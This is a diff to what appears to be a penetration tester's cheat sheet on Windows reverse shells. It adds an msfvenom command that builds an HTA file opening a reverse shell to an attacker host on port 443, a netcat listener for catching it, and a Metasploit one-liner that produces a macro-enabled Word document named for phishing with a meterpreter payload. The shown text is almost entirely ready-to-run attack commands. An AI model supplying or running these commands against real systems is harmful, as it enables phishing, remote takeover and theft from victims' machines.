@@ -99,6 +99,23 @@ exploit
 https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
 
 
+Using HTA :
+```bash
+msfvenom -p windows/shell_reverse_tcp lhost=192.168.154.138 lport=443 -f hta-psh > shell.hta
+
+#In attacker machine.
+nc -nvlp 443
+```
+
+
+Creating Phishing Doc:
+```bash
+msfconsole -x "use exploit/multi/fileformat/office_word_macro; set CUSTOMTEMPLATE /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx; set FILENAME phishing.docm; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.154.138; set LPORT 443; set EXITFUNC thread; set DisablePayloadHandler true; exploit"
+```
+
+
+
+
 Basic trojan:
 ```bash
 @echo off
